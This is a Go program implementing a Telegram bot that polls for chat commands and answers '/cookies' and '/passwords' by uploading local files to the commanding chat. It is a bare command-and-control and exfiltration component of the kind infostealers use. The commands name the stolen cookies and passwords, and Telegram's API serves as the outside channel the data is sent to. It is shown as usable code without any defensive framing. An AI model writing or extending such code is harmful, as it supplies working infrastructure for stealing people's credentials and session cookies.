package main 

import (
	"io"
	"os"
	"fmt"
	"time"
	"bytes"
	"strconv"
	"net/http"
	"io/ioutil"
	"path/filepath"
	"encoding/json"
	"mime/multipart"
)

var (
	token string
	getUpdates string
	sendDocument string

	response chan []byte
	command chan Message
	target chan string
)

type Config struct {
	Token string `json:"token"`
}

type Chat struct {
	ChatID int `json:"id"`
}

type Message struct {
	ID int `json:"message_id"` 
	Timestamp int `json:"date"`
	Text string `json:"text"`
	From Chat `json:"chat"` 
}

type Update struct {
	Msg Message `json:"message"`
}

type ResponseUpdates struct {
	Results []Update `json:"result"`
}

type requestSendDocument struct {
	ChatID int `json:"chat_id"`
	Document string `json:"document"`
	Caption string `json:"caption"`
}

func readToken() string {

	configFile, err := os.Open("config.json")

	configBytes, err := ioutil.ReadAll(configFile)

	if err != nil {
		
		fmt.Println("Error while reading config file")

	}

	var config Config
	
	err = json.Unmarshal(configBytes, &config)

	if err != nil {

		fmt.Println("Error while unpacking the json")

	}

	return config.Token

}

func poller(interval int) {

	for {

		res, err := http.Get(getUpdates)

		// Error handling for GET request
		if err != nil {
			
			fmt.Println("Error in polling request")

		}

		body, err := ioutil.ReadAll(res.Body)

		// Error handling for body reading
		if err != nil {

			fmt.Println("Error in reading the response body")

		}

		response <- body 
		
		// Setting the interval between two requests
		time.Sleep(time.Duration(interval) * time.Second)

	}

}

func getCommand() {
	
	lastCommand := 0

	for {
	
		body := <- response

		updates := ResponseUpdates{}

		err := json.Unmarshal(body, &updates)

		if err != nil {

			fmt.Println("Error with unpacking the json", err)
		
		}	

		if lastCommand == 0 && updates.Results != nil {

			lastCommand = updates.Results[len(updates.Results) - 1].Msg.ID

		}

		if updates.Results[len(updates.Results) - 1].Msg.ID > lastCommand{
			
			lastCommand = updates.Results[len(updates.Results) - 1].Msg.ID 
		
			command <- updates.Results[len(updates.Results) - 1].Msg 
		}

	}

}

func fileSender(chatID int, filePath string) {
	
	file, err := os.Open(filePath)
		
	if err != nil {
	
		fmt.Println("Error in opening the file/file path")

	}	

	body := &bytes.Buffer{}

	writer := multipart.NewWriter(body)

	chatIDstr := strconv.Itoa(chatID)

	// Writing the body of the POST request 
	writer.WriteField("chat_id", chatIDstr)

	writer.WriteField("document", "attach://file")

	// Creating the file part 
	part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))

	io.Copy(part, file)

	writer.Close()

	// Creating the request to the bot 
	req, err := http.NewRequest("POST", sendDocument, body)
		
	req.Header.Add("Content-Type", writer.FormDataContentType())

	client := &http.Client{}

	res, err := client.Do(req)

	if err != nil {

		fmt.Println(res)

		fmt.Println(err)

	}

}

func execCommand() {
	

	for {
		
		cmd := <- command
			
		switch cmd.Text {
		
			case "/cookies":	
				fileSender(cmd.From.ChatID, "ciao.txt")		
			case "/passwords":
				fileSender(cmd.From.ChatID, "arrivederci.txt")

		}

	}
}

func main() {
	
	token = readToken()
	getUpdates = "https://api.telegram.org/bot" + token + "/getUpdates"
	sendDocument = "https://api.telegram.org/bot" + token + "/sendDocument"

	response = make(chan []byte)
	command = make(chan Message)
	target = make(chan string)

	go poller(5)

	go getCommand()

	go execCommand()

	for {
		
	}

}
